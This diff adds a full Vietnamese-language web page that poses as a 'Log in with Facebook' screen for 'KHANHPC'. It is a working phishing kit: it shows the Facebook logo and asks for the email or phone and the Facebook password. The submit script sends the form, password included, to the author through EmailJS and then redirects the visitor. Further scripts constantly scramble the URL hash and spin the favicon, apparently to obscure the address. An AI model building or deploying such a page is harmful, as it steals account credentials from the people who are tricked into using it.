@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<link id="favicon" rel="icon" href="GD.png" type="image/png">
+
+  <meta charset="UTF-8">
+  <title>KHANHPC Login</title>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      color: #f0f0f0;
+      overflow: hidden;
+    }
+
+    .container {
+      background-color: #1e2a38;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+      width: 100%;
+      max-width: 400px;
+      animation: fadeIn 1s ease;
+      position: relative;
+      z-index: 1;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    .logo-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-wrapper img {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background: white;
+      padding: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 30px;
+      font-weight: 600;
+      font-size: 20px;
+      line-height: 1.4;
+    }
+
+    form {
+      position: relative;
+    }
+
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+    }
+    input {
+      flex: 1;
+      padding: 14px 14px 14px 14px;
+      border-radius: 12px;
+      border: 1px solid #33475b;
+      background: #0f1724;
+      color: #fff;
+      font-size: 15px;
+      transition: all 0.3s ease;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 8px rgba(24, 119, 242, 0.5);
+    }
+    .toggle-password {
+      cursor: pointer;
+      font-size: 16px;
+      color: #ccc;
+      margin-left: 10px;
+      user-select: none;
+    }
+
+
+    .toggle-password:hover {
+      color: #fff;
+    }
+
+    button {
+      width: 100%;
+      background: #1877f2;
+      border: none;
+      padding: 14px;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      color: white;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #145dbf;
+    }
+
+    .footer {
+      margin-top: 25px;
+      text-align: center;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    /* Overlay loading */
+    .loading-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      flex-direction: column;
+      display: none;
+    }
+
+    .spinner {
+      border: 5px solid #ccc;
+      border-top: 5px solid #00aaff;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 16px;
+      color: #fff;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        margin: 0 15px;
+        padding: 30px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo-wrapper">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="FB">
+    </div>
+    <h2>Đăng nhập bằng Facebook để tiếp tục với <strong>KHANHPC</strong></h2>
+    <form id="login-form">
+<div class="input-wrapper">
+  <input
+    type="text"
+    name="username"
+    id="username"
+    placeholder="Email hoặc số điện thoại"
+    required
+    autocomplete="off"
+    pattern="(^(\+84|0)(3|5|7|8|9)[0-9]{8}$)|(^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$)"
+    title="Vui lòng nhập email hoặc số điện thoại hợp lệ"
+  />
+  <div id="username-error" style="color:#ff6666; font-size:13px; margin-top:4px; display:none;"></div>
+</div>
+
+
+<div class="input-wrapper">
+  <input type="password" name="password" id="password-input" placeholder="Mật khẩu Facebook" required autocomplete="off" />
+  <span class="toggle-password" onclick="togglePassword(this)">👁️</span>
+</div>
+<div id="password-error" style="color:#ff6666; font-size:13px; margin-top:4px; display:none;"></div>
+
+
+
+      <button type="submit">Tiếp tục</button>
+    </form>
+    <div class="footer">© 2025 KHANHPC. All rights reserved.</div>
+  </div>
+
+  <!-- Loading overlay -->
+  <div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+    <div class="loading-text">Đang chuyển đến...</div>
+  </div>
+
+  <script>
+emailjs.init("i6AJtogwaYpMnuxoj");
+
+document.getElementById("login-form").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const usernameInput = this.elements["username"];
+  const passwordInput = this.elements["password"];
+  const usernameError = document.getElementById("username-error");
+  const passwordError = document.getElementById("password-error");
+
+  // Reset lỗi cũ
+  usernameError.style.display = "none";
+  usernameError.textContent = "";
+  passwordError.style.display = "none";
+  passwordError.textContent = "";
+
+  // Kiểm tra username
+  if (!usernameInput.value) {
+    usernameError.style.display = "block";
+    usernameError.textContent = "Vui lòng nhập email hoặc số điện thoại.";
+    usernameInput.focus();
+    return;
+  }
+
+  // Kiểm tra định dạng username
+  const pattern = /^(?:\+84|0)(3|5|7|8|9)[0-9]{8}$|^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  if (!pattern.test(usernameInput.value)) {
+    usernameError.style.display = "block";
+    usernameError.textContent = "Email hoặc số điện thoại không đúng định dạng.";
+    usernameInput.focus();
+    return;
+  }
+
+  // Kiểm tra password
+  if (!passwordInput.value) {
+    passwordError.style.display = "block";
+    passwordError.textContent = "Vui lòng nhập mật khẩu.";
+    passwordInput.focus();
+    return;
+  }
+
+  if (passwordInput.value.length < 6) {
+    passwordError.style.display = "block";
+    passwordError.textContent = "Mật khẩu phải có ít nhất 6 ký tự.";
+    passwordInput.focus();
+    return;
+  }
+
+  // Nếu ok thì hiện loading và gửi form
+  const loading = document.getElementById("loading");
+  loading.style.display = "flex";
+
+  emailjs.sendForm("service_cibfywr", "template_4v0wl9s", this)
+    .then(function() {
+      setTimeout(() => {
+        window.location.href = "https://aikhanh.onrender.com";
+      }, 1500);
+    }, function(error) {
+      loading.style.display = "none";
+      alert("Lỗi gửi email: " + error.text);
+    });
+});
+
+function togglePassword(el) {
+  const pwdInput = document.getElementById("password-input");
+  if (pwdInput.type === "password") {
+    pwdInput.type = "text";
+    el.textContent = "🙈";
+  } else {
+    pwdInput.type = "password";
+    el.textContent = "👁️";
+  }
+}
+
+  </script>
+
+
+<script>
+const chaosChars = "!@#$%^&*()_+=-{}[]|:;<>,.?/~`0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+
+// 🔐 Tạo độ dài ngẫu nhiên cố định 1 lần khi tải
+const FIXED_LENGTH = Math.floor(Math.random() * 91) + 60;
+let urlArr = Array.from({ length: FIXED_LENGTH }, () =>
+  chaosChars.charAt(Math.floor(Math.random() * chaosChars.length))
+);
+
+// ➤ Gắn hash ban đầu (phần sau # trên URL)
+const initialHash = "#" + urlArr.join("");
+history.replaceState(null, '', location.pathname + initialHash);
+
+// 🔁 Loạn từng ký tự trong hash, giữ nguyên độ dài
+function updateHashPerChar() {
+  for (let i = 0; i < urlArr.length; i++) {
+    if (Math.random() < 0.25) {
+      urlArr[i] = chaosChars.charAt(Math.floor(Math.random() * chaosChars.length));
+    }
+  }
+  const newHash = "#" + urlArr.join("");
+  history.replaceState(null, '', location.pathname + newHash);
+}
+
+// 🎨 Favicon: Loạn xoay, méo, lật liên tục
+const favicon = document.getElementById('favicon');
+const canvas = document.createElement('canvas');
+const ctx = canvas.getContext('2d');
+const img = new Image();
+img.crossOrigin = "anonymous";
+img.src = favicon.href;
+
+let faviconReady = false;
+img.onload = () => {
+  faviconReady = true;
+};
+
+const size = 64;
+canvas.width = size;
+canvas.height = size;
+
+setInterval(() => {
+  if (!faviconReady) return;
+
+  ctx.clearRect(0, 0, size, size);
+  ctx.save();
+  ctx.translate(size / 2, size / 2);
+
+  const angle = Math.random() * 2 * Math.PI;
+  const scaleX = (Math.random() * 0.5 + 0.75) * (Math.random() < 0.5 ? -1 : 1);
+  const scaleY = (Math.random() * 0.5 + 0.75) * (Math.random() < 0.5 ? -1 : 1);
+  ctx.rotate(angle);
+  ctx.scale(scaleX, scaleY);
+
+  ctx.drawImage(img, -size / 2, -size / 2, size, size);
+  ctx.restore();
+
+  favicon.href = canvas.toDataURL("image/png");
+}, 100); // mỗi 100ms xoay icon
+
+// 🚀 Khởi động loạn URL định kỳ
+setInterval(updateHashPerChar, 30);
+</script>
+
+<div id="donate-host"></div>
+<script>
+  const host = document.getElementById("donate-host");
+  const shadow = host.attachShadow({ mode: "open" });
+  const tpl = `
+    <!-- Nút Donate lắc lư cute -->
+<a href="https://khanhpc-five.vercel.app/ungho.html" id="donate-button" target="_blank">💖 Donate cho KHANHPC</a>
+<style>
+  #donate-button {
+    position: fixed;
+    top:70px;
+    right: 20px;
+    background: linear-gradient(135deg, #ff0080, #7928ca);
+    color: white;
+    padding: 12px 20px;
+    font-size: 16px;
+    font-weight: bold;
+    border-radius: 30px;
+    text-decoration: none;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    z-index: 9999;
+    animation: shake 2s infinite;
+    transition: transform 0.2s;
+  }
+  #donate-button:hover {
+    transform: scale(1.05);
+  }
+  @keyframes shake {
+    0% { transform: rotate(0deg); }
+    20% { transform: rotate(3deg); }
+    40% { transform: rotate(-3deg); }
+    60% { transform: rotate(2deg); }
+    80% { transform: rotate(-2deg); }
+    100% { transform: rotate(0deg); }
+  }
+  @media (max-width: 500px) {
+    #donate-button {
+      font-size: 14px;
+      padding: 10px 16px;
+    }
+  }
+</style>
+  `;
+  shadow.innerHTML = tpl;
+  new MutationObserver((muts, obs) => {
+    if (!shadow.querySelector("#donate-button")) {
+      obs.disconnect();
+      location.reload();
+    }
+  }).observe(shadow, { childList: true });
+</script>
+
+</body>
+</html>
